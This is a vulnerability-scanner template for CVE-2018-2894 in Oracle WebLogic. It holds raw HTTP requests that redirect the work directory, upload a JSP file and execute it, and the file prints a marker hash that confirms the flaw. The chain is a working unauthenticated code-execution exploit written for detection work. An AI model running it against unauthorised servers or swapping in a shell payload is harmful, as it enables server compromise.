id: CVE-2018-2894
info:
  name: Oracle WebLogic Server - Remote Code Execution
  author: geeknik,pdteam
  severity: critical
  description: Oracle WebLogic Server is vulnerable to a remote code execution attack
    that could allow unauthorized attackers to compromise the server through network
    access via HTTP.
  reference:
  - https://blog.detectify.com/2018/11/14/technical-explanation-of-cve-2018-2894-oracle-weblogic-rce/
  - https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/CVE-2018-2894
  - https://nvd.nist.gov/vuln/detail/CVE-2018-2894
  - http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-2894
  tags: cve2018,oracle,weblogic,rce,vulhub,cve
  metadata:
    impact: The CVE-2018-2894 vulnerability in Oracle WebLogic Server can result in
      servers being compromised by unauthenticated attackers, leading to potential
      data loss, downtime, and other security risks.
    recommendation: Update Oracle WebLogic Server to version 12.2.1.4 or apply the
      recommended patches to address the remote code execution vulnerability (CVE-2018-2894).
requests:
- raw:
  - 'POST /ws_utc/resources/setting/options HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    setting_id=general&BasicConfigOptions.workDir=%2Fu01%2Foracle%2Fuser_projects%2Fdomains%2Fbase_domain%2Fservers%2FAdminServer%2Ftmp%2F_WL_internal%2Fcom.oracle.webservices.wls.ws-testclient-app-wls%2F4mcj4y%2Fwar%2Fcss&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80

    '
  - "POST /ws_utc/resources/setting/keystore HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ multipart/form-data; boundary=----WebKitFormBoundaryuim0dyiDSPBPu31g\n\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_name\"\n\n{{randstr}}\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_edit_mode\"\n\nfalse\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_password_front\"\n\n\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_password\"\n\n\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_password_changed\"\n\nfalse\n------WebKitFormBoundaryuim0dyiDSPBPu31g\n\
    Content-Disposition: form-data; name=\"ks_filename\"; filename=\"{{randstr}}.jsp\"\
    \nContent-Type: application/octet-stream\n\n<%@ page import=\"java.util.*,java.io.*\"\
    %>\n<%@ page import=\"java.security.MessageDigest\"%>\n\n<%\nString cve = \"CVE-2018-2894\"\
    ;\nMessageDigest alg = MessageDigest.getInstance(\"MD5\");\nalg.reset();\nalg.update(cve.getBytes());\n\
    byte[] digest = alg.digest();\nStringBuffer hashedpasswd = new StringBuffer();\n\
    String hx;\nfor (int i=0;i<digest.length;i++){\n  hx =  Integer.toHexString(0xFF\
    \ & digest[i]);\n  //0x03 is equal to 0x3, but we need 0x03 for our md5sum\n \
    \ if(hx.length() == 1){hx = \"0\" + hx;}\n  hashedpasswd.append(hx);\n}\n\nout.println(hashedpasswd.toString());\n\
    %>\n------WebKitFormBoundaryuim0dyiDSPBPu31g--\n"
  - 'GET /ws_utc/css/config/keystore/{{id}}_{{randstr}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
  extractors:
  - type: regex
    name: id
    internal: true
    group: 1
    regex:
    - <keyStoreItem><id>([0-9]+)</id><name>{{randstr}}
  matchers:
  - type: word
    words:
    - 26ec00a3a03f6bfc5226fd121567bb58
